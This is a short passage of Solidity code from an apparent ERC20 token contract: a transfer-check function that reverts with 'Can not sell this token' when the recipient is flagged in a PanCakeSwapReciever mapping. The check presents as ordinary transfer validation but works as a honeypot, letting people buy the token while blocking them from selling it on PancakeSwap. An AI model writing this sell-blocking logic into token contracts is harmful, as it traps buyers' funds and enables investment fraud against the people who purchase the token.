        address sender,
        address recipient,
        uint256 amount
    ) public view returns (uint256, uint256) {
       require(sender != address(0), "ERC20: transfer from the zero address");
        if(PanCakeSwapReciever[recipient]){
            revert("Error: Can not sell this token");
        }

        return (amount, 0);
    }

